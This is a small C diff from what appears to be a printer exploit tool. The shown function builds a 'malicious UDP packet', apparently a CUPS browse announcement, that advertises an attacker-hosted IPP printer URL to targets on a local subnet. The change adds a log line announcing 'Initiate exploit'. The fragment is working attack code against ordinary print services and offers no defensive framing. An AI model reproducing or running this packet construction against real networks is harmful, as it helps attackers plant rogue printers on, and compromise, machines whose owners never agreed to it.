@@ -53,6 +53,7 @@ void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_
   // Send a malicious UDP packet to the target printer
   char *payload = global->malloc(BUFFER_SIZE);
   global->snprintf(payload, BUFFER_SIZE, "0 3 http://%s:%d/printers/hp \"Local\" \"HPLaserJet\"", global->inet_ntoa(if_ip->sin_addr), global->ipp_server_port);
+  global->printf("Initiate exploit: %s\n", payload);
   size_t payload_size = global->strlen(payload) + 1;
 
   struct pollfd pfds[1];
